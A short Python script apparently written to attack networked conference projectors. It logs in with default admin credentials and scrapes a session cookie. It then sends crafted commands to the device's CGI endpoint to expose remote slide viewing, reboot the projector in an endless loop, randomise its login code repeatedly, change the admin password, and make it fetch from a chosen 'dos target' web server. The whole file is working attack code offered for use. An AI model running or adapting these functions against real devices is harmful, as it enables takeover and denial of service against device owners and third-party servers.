#!/usr/bin/python3

#------------------------------------------------------------------------------------
#
#   Purpose: Individual Functions
#
#   Version: 1
#
#   Date: 9/24/2019
#
#-------------------------------------------------------------------------------------

import requests
import random
import urllib3

urllib3.disable_warnings()

#host is the projector, username is generally admin, password is generally admin
def AdminLogin(host,username,password):
    print("Trying to login now")

    #URL of Projector
    url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"

    #POST Data
    data = {
        'login': 'admin',
        'account': username,
        'password': password,
        'Login.x':'56',
        'Login.y':'16'

    }

    #Send Login Request
    login = requests.post(url = url, data = data, verify=False)

    #Pull Out Cookie So You Can Keep Making Requests
    cookieStart=login.text.split("document.write(\"<form name=\'form0\' action=\'/cgi-bin/reboot.cgi?lang=en&")
    cookieMid=cookieStart[1].split("'")
    cookie=cookieMid[0]
    return cookie
#host is the target, coookie is cookie from AdminLogin
def ToggleRemote(host, cookie):
    #Turn Remove View Off
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Remote View Active")

#host is the target, coookie is cookie from AdminLogin, loop is True or False
def Reboot(host, cookie, loop):
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
    }
    reboot = requests.post(url=url,data=data, verify=False)
    while loop:
        reboot = requests.post(url=url,data=data, verify=False)

    print("Reboot Incoming")
    
#host is the target, coookie is cookie from AdminLogin, WebServer is dos target
def WebDos(host,cookie,WebServer):
    WebServer="YourTargetHere"
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command"	:"<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Web Request Sent")

    #host is the target, coookie is cookie from AdminLogin
def CodeCycle(host, cookie):
    while True:
            randomInt = random.randint(1,9999)
            url = "https://"+ host + "/cgi-bin/return.cgi"
            data = {
                'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
            }
            remoteViewOn = requests.post(url=url,data=data, verify=False)
            print("Cycle")
            
#host is the target, coookie is cookie from AdminLogin,newPass is the pass you want to change it to
def ChangePass(host, cookie, newPass):
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command"	:"<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newPass + "</value></Send>"
    }
    changePass = requests.post(url=url,data=data, verify=False)
    print("Password Change Request Sent")
